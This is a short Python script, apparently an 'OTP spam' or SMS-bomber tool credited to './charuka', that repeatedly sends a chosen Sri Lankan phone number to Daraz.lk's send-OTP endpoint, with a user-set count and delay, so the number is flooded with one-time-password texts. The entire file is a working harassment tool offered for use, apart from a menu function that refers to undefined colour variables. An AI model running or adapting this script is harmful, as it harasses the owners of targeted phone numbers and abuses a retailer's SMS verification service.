#!/usr/bin/python
import requests, json, time, sys, os

# -----------------------Colors----------------------------
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
# -------------------------------------------------------

#------------------------Class------------------------
class spam:
    def __init__(self, nomer):
        self.nomer = nomer

    # Daraz.lk OTP sender
    def daraz(self):
        url = 'https://my.daraz.lk/customer/account/sendotp'
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        data = {
            'mobile': self.nomer
        }
        response = requests.post(url, headers=headers, data=data)
        if response.status_code == 200:
            return f'\x1b[92mSpamm Daraz {self.nomer} {h}Success!'
        else:
            return f'\x1b[91mSpamm Daraz {self.nomer} {m}Fail!'

# ---------------------------Functions----------------------------
def single():
    nomer = str(input(k + '\tPhone number (without +94): ' + h))
    jm = int(input(k + '\tTotal spam: ' + h))
    dly = int(input(k + '\tDelay: ' + h))
    for oo in range(jm):
        z = spam(nomer)
        print('\t' + z.daraz())
        time.sleep(dly)
    apakah()

def apakah():
    while True:
        lan = str(input(k + '\tWant more? y/n : ' + h))
        if lan == 'y' or lan == 'Y':
            main()
        elif lan == 'n' or lan == 'N':
            print(p)
            break
        else:
            continue

# -------------------------Banner-----------------------
def logo():
    os.system('clear')
    auth = m + '  Author : ' + k + './charuka📡'
    return '''
%s╭━┳━╭━╭━╮%s╮╲╲╲╲╲╲%s╔═╗╔═╗╔═╗╔╦╗
%s┃┈┈┈┣▅╋▅┫┃%s╲╲╲╲╲╲%s╚═╗╠═╝╠═╣║║║
%s┃┈┃┈╰━╰━━━━━━╮%s╲╲%s╚═╝╩  ╩ ╩╩ ╩
%s╰┳╯┈┈┈┈┈┈┈┈┈◢▉◣%s╲%s╔═╗╔╦╗╔═╗
%s╲┃┈┈┈┈┈┈┈┈┈▉▉▉%s╲%s╚═╗║║║╚═╗
%s╲┃┈┈┈┈┈┈┈┈┈◥▉◤%s╲%s╚═╝╩ ╩╚═╝
%s╲┃┈┈┈┈╭━┳━━━━╯%s╲╲%s╦ ╦╦ ╦╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗
%s╲┣━━━━━━┫%s╲╲╲╲╲╲╲%s║║║╠═╣╠═╣ ║ ╚═╗╠═╣╠═╝╠═╝
%s╲┃┈┈┈┈┈┈┃%s╲╲╲╲╲╲╲%s╚╩╝╩ ╩╩ ╩ ╩ ╚═╝╩ ╩╩  ╩  
%s''' % (k, m, h, k, m, h, k, m, h, k, m, h, k, m, h, k, m, h, k, m, h, k, m, h)

# -------------------------Main-----------------------
def main():
    print(logo())
    print(b + '╔══════════════════════════════\n' + b + '║' + h + '〘 ' + m + 'SPAM ' + h + '〙\n' + b + '╠══════════════════════════════' + b + '\n║' + m + '『' + h + '1' + m + '』 ' + bm + 'Daraz.lk OTP\n' + b + '╠══════════════════════════════')
    single()

if __name__ == '__main__':
    main()
